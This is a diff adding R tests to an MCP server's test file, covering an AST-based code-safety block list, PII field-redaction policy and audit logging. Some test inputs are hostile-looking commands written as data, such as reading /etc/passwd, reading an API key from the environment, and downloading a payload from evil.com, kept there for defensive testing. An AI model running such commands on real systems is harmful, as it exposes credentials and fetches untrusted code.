@@ -493,6 +493,338 @@ test("initialize response: has instructions", {
   parsed$result$instructions == "test instructions"
 })
 
+# ── 8. AST Code Inspection Tests ──────────────────────────────────────
+
+cat("\n--- AST Code Inspection ---\n")
+
+# Define the functions locally for testing
+BLOCKED_PACKAGES <- c("brightspaceR", "httr", "httr2", "curl", "jsonlite", "config")
+
+BLOCKED_FUNCTIONS <- c(
+  "eval", "evalq", "do.call", "get", "mget", "exists", "match.fun",
+  "getExportedValue", "loadNamespace", "requireNamespace",
+  "Sys.getenv", "Sys.setenv",
+  "system", "system2", "shell",
+  "readLines", "scan", "file", "readRDS", "writeLines",
+  "write.csv", "write.csv2", "saveRDS",
+  "download.file", "url", "socketConnection"
+)
+
+walk_ast <- function(expr, blocked = character(0)) {
+  if (is.call(expr)) {
+    fn <- expr[[1]]
+    if (is.call(fn) && length(fn) == 3 &&
+        (identical(fn[[1]], as.name("::")) || identical(fn[[1]], as.name(":::")))) {
+      pkg_name <- as.character(fn[[2]])
+      if (pkg_name %in% BLOCKED_PACKAGES) {
+        blocked <- c(blocked, paste0(pkg_name, "::", as.character(fn[[3]])))
+      }
+    } else if (is.name(fn)) {
+      fn_name <- as.character(fn)
+      if (fn_name %in% BLOCKED_FUNCTIONS) {
+        blocked <- c(blocked, fn_name)
+      }
+    } else if (is.call(fn) && length(fn) == 3 && identical(fn[[1]], as.name("$"))) {
+      compound <- paste0(as.character(fn[[2]]), "$", as.character(fn[[3]]))
+      if (compound %in% BLOCKED_FUNCTIONS) {
+        blocked <- c(blocked, compound)
+      }
+    }
+    for (i in seq_along(expr)) {
+      blocked <- walk_ast(expr[[i]], blocked)
+    }
+  } else if (is.pairlist(expr) || (is.recursive(expr) && !is.environment(expr))) {
+    for (i in seq_along(expr)) {
+      blocked <- walk_ast(expr[[i]], blocked)
+    }
+  }
+  blocked
+}
+
+check_code_safety <- function(code) {
+  parsed <- tryCatch(parse(text = code), error = function(e) NULL)
+  if (is.null(parsed)) return(list(safe = TRUE))
+  blocked <- character(0)
+  for (i in seq_along(parsed)) {
+    blocked <- walk_ast(parsed[[i]], blocked)
+  }
+  blocked <- unique(blocked)
+  if (length(blocked) == 0) list(safe = TRUE)
+  else list(safe = FALSE, blocked = blocked)
+}
+
+# Clean code that MUST pass
+test("AST: dplyr pipe chain passes", {
+  r <- check_code_safety("mtcars %>% filter(cyl == 6) %>% summarise(mean_mpg = mean(mpg))")
+  r$safe
+})
+
+test("AST: ggplot2 code passes", {
+  r <- check_code_safety("ggplot(mtcars, aes(x = hp, y = mpg)) + geom_point() + labs(title = 'Test')")
+  r$safe
+})
+
+test("AST: basic assignment and arithmetic passes", {
+  r <- check_code_safety("x <- 1 + 2\ny <- x * 3")
+  r$safe
+})
+
+test("AST: comments containing blocked names pass", {
+  r <- check_code_safety("# system('hello')\nx <- 1")
+  r$safe
+})
+
+test("AST: strings containing blocked names pass", {
+  r <- check_code_safety('msg <- "call system() to get info"\nprint(msg)')
+  r$safe
+})
+
+# Blocked code that MUST fail
+test("AST: brightspaceR::bs_get blocked", {
+  r <- check_code_safety("brightspaceR::bs_get()")
+  !r$safe && any(grepl("brightspaceR", r$blocked))
+})
+
+test("AST: brightspaceR::: internal access blocked", {
+  r <- check_code_safety("brightspaceR:::internal_fn()")
+  !r$safe && any(grepl("brightspaceR", r$blocked))
+})
+
+test("AST: httr::GET blocked", {
+  r <- check_code_safety("httr::GET('http://example.com')")
+  !r$safe && any(grepl("httr", r$blocked))
+})
+
+test("AST: httr2::request blocked", {
+  r <- check_code_safety("httr2::request('http://example.com')")
+  !r$safe && any(grepl("httr2", r$blocked))
+})
+
+test("AST: curl::curl blocked", {
+  r <- check_code_safety("curl::curl('http://example.com')")
+  !r$safe && any(grepl("curl", r$blocked))
+})
+
+test("AST: config::get blocked", {
+  r <- check_code_safety("config::get('default')")
+  !r$safe && any(grepl("config", r$blocked))
+})
+
+test("AST: eval() blocked", {
+  r <- check_code_safety("eval(parse(text = 'system(\"ls\")'))")
+  !r$safe && "eval" %in% r$blocked
+})
+
+test("AST: evalq() blocked", {
+  r <- check_code_safety("evalq(x + 1)")
+  !r$safe && "evalq" %in% r$blocked
+})
+
+test("AST: do.call() blocked", {
+  r <- check_code_safety("do.call(sum, list(1:10))")
+  !r$safe && "do.call" %in% r$blocked
+})
+
+test("AST: get() and mget() blocked", {
+  r <- check_code_safety("get('secret_var')\nmget(c('a','b'))")
+  !r$safe && "get" %in% r$blocked && "mget" %in% r$blocked
+})
+
+test("AST: Sys.getenv() blocked", {
+  r <- check_code_safety("Sys.getenv('API_KEY')")
+  !r$safe && "Sys.getenv" %in% r$blocked
+})
+
+test("AST: system() and system2() blocked", {
+  r <- check_code_safety("system('whoami')\nsystem2('ls')")
+  !r$safe && "system" %in% r$blocked && "system2" %in% r$blocked
+})
+
+test("AST: readLines() and writeLines() blocked", {
+  r <- check_code_safety("readLines('/etc/passwd')\nwriteLines('hi', 'out.txt')")
+  !r$safe && "readLines" %in% r$blocked && "writeLines" %in% r$blocked
+})
+
+test("AST: readRDS() and saveRDS() blocked", {
+  r <- check_code_safety("readRDS('data.rds')\nsaveRDS(x, 'out.rds')")
+  !r$safe && "readRDS" %in% r$blocked && "saveRDS" %in% r$blocked
+})
+
+test("AST: download.file() blocked", {
+  r <- check_code_safety("download.file('http://evil.com/payload', 'out')")
+  !r$safe && "download.file" %in% r$blocked
+})
+
+test("AST: multiple blocked constructs in one expression", {
+  r <- check_code_safety("system('ls')\neval(parse(text='1'))\nhttr::GET('url')")
+  !r$safe && length(r$blocked) == 3
+})
+
+test("AST: syntax errors pass through (safe=TRUE)", {
+  r <- check_code_safety("this is not valid R {{{{")
+  r$safe
+})
+
+# ── 9. PII Field Policy Tests ───────────────────────────────────────────
+
+cat("\n--- PII Field Policy ---\n")
+
+# Define apply_field_policy locally for testing
+.test_policy_cache <- new.env(parent = emptyenv())
+
+apply_field_policy_test <- function(df, dataset_name, policy) {
+  ds_policy <- policy[[dataset_name]]
+  if (is.null(ds_policy)) return(df)
+  mode <- ds_policy$mode
+  if (is.null(mode) || mode == "all") return(df)
+  if (mode == "allow") {
+    allowed <- ds_policy$fields
+    if (is.null(allowed)) return(df)
+    keep <- intersect(allowed, names(df))
+    return(df[, keep, drop = FALSE])
+  }
+  if (mode == "redact") {
+    redact_cols <- ds_policy$fields
+    if (!is.null(redact_cols)) {
+      for (col in redact_cols) {
+        if (col %in% names(df)) df[[col]] <- "[REDACTED]"
+      }
+    }
+    return(df)
+  }
+  df
+}
+
+# Load the real policy file
+policy_path <- file.path(pkg_root, "inst", "mcp", "field_policy.yml")
+if (file.exists(policy_path)) {
+  test_policy <- yaml::read_yaml(policy_path)
+} else {
+  cat("WARNING: field_policy.yml not found at", policy_path, "\n")
+  test_policy <- list()
+}
+
+test("field policy: allow mode keeps only listed fields", {
+  df <- data.frame(UserId = 1, FirstName = "Jane", LastName = "Doe",
+                   Organization = "Org1", IsActive = TRUE, stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "Users", test_policy)
+  "UserId" %in% names(result) && "Organization" %in% names(result) &&
+    !("FirstName" %in% names(result)) && !("LastName" %in% names(result))
+})
+
+test("field policy: allow mode excludes PII (ExternalEmail)", {
+  df <- data.frame(UserId = 1, ExternalEmail = "jane@example.com",
+                   Organization = "Org1", stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "Users", test_policy)
+  !("ExternalEmail" %in% names(result))
+})
+
+test("field policy: redact mode replaces values", {
+  # Create a test policy with redact mode
+  redact_policy <- list(TestDS = list(mode = "redact", fields = list("Secret")))
+  df <- data.frame(Id = 1, Secret = "password123", Public = "hello",
+                   stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "TestDS", redact_policy)
+  result$Secret == "[REDACTED]" && result$Public == "hello"
+})
+
+test("field policy: all mode passes everything through", {
+  df <- data.frame(OrgUnitId = 1, Name = "Test Org", Code = "T01",
+                   stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "Org Units", test_policy)
+  ncol(result) == 3
+})
+
+test("field policy: unknown dataset passes through", {
+  df <- data.frame(a = 1, b = 2, stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "NonExistentDataset", test_policy)
+  identical(names(result), c("a", "b"))
+})
+
+test("field policy: new/unknown columns excluded by allow mode", {
+  df <- data.frame(UserId = 1, Organization = "Org1",
+                   BrandNewColumn = "surprise", stringsAsFactors = FALSE)
+  result <- apply_field_policy_test(df, "Users", test_policy)
+  !("BrandNewColumn" %in% names(result))
+})
+
+test("field policy: default YAML is valid", {
+  length(test_policy) > 0
+})
+
+test("field policy: Users is in allow mode with PII excluded", {
+  !is.null(test_policy[["Users"]]) &&
+    test_policy[["Users"]]$mode == "allow" &&
+    !("FirstName" %in% test_policy[["Users"]]$fields) &&
+    !("LastName" %in% test_policy[["Users"]]$fields) &&
+    !("ExternalEmail" %in% test_policy[["Users"]]$fields) &&
+    "UserId" %in% test_policy[["Users"]]$fields
+})
+
+test("field policy: Role Details is in all mode", {
+  !is.null(test_policy[["Role Details"]]) &&
+    test_policy[["Role Details"]]$mode == "all"
+})
+
+# ── 10. Audit Logging Tests ─────────────────────────────────────────────
+
+cat("\n--- Audit Logging ---\n")
+
+audit_test_dir <- tempfile("audit_test")
+dir.create(audit_test_dir)
+AUDIT_LOG_PATH_TEST <- file.path(audit_test_dir, "mcp_audit.jsonl")
+
+audit_log_test <- function(tool, arguments = NULL, response_bytes = 0L,
+                           code_blocked = FALSE, blocked_constructs = NULL,
+                           is_error = FALSE) {
+  entry <- list(
+    timestamp = format(Sys.time(), "%Y-%m-%dT%H:%M:%OS3Z", tz = "UTC"),
+    tool = tool
+  )
+  if (!is.null(arguments)) {
+    args_copy <- arguments
+    if (!is.null(args_copy$code) && nchar(args_copy$code) > 500) {
+      args_copy$code <- paste0(substr(args_copy$code, 1, 500), "...[truncated]")
+    }
+    entry$arguments <- args_copy
+  }
+  entry$response_bytes <- as.integer(response_bytes)
+  entry$code_blocked <- code_blocked
+  if (!is.null(blocked_constructs) && length(blocked_constructs) > 0) {
+    entry$blocked_constructs <- as.list(blocked_constructs)
+  }
+  entry$is_error <- is_error
+  line <- as.character(to_json(entry))
+  cat(line, "\n", sep = "", file = AUDIT_LOG_PATH_TEST, append = TRUE)
+}
+
+test("audit: entry is valid JSONL", {
+  audit_log_test("execute_r", arguments = list(code = "1+1"), response_bytes = 42L)
+  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
+  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
+  !is.null(parsed$timestamp) && parsed$tool == "execute_r" &&
+    parsed$response_bytes == 42
+})
+
+test("audit: blocked code logged with constructs", {
+  audit_log_test("execute_r", arguments = list(code = "system('ls')"),
+                 code_blocked = TRUE, blocked_constructs = c("system"),
+                 is_error = TRUE)
+  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
+  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
+  parsed$code_blocked == TRUE && "system" %in% unlist(parsed$blocked_constructs)
+})
+
+test("audit: error entries have is_error = TRUE", {
+  audit_log_test("describe_dataset", is_error = TRUE)
+  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
+  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
+  parsed$is_error == TRUE
+})
+
+# Clean up
+unlink(audit_test_dir, recursive = TRUE)
+
 # ── Summary ──────────────────────────────────────────────────────────────
 
 cat("\n=== Results ===\n")
